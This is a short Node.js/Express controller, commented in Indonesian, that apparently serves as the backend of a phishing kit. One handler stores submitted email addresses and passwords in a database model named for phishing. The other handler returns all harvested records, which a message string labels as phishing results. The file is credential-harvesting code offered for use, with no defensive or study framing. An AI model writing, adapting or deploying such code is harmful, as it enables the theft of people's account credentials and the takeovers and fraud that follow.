const PhisingData = require("../models/phising.model");

// Mendapatkan Semua Phising
exports.getAllPhising = async (req, res) => {
  PhisingData.find().exec((err, data) => {
    if (!err) {
      res.status(200).json({
        message: "Berhasil Mendapatkan Semua Hasil Phising,",
        data,
      });
    } else {
      res.status(400).send("Gagal Mendapatkan Semua Face, ERR : " + err);
    }
  });
};

// Mendapatkan Semua Phising
exports.savePhising = async (req, res) => {
  try {
    const { usa_email, usa_pswd } = req.body;
    const data = new PhisingData({
      usa_email,
      usa_pswd,
    });
    await data.save().then(() => {
      res.status(200).json({
        data,
        message: `Phising Berhasil Disimpan`,
      });
    });
  } catch (error) {
    res.status(400).send("Gagal Menyimpan Data, ERR : " + error);
  }
};
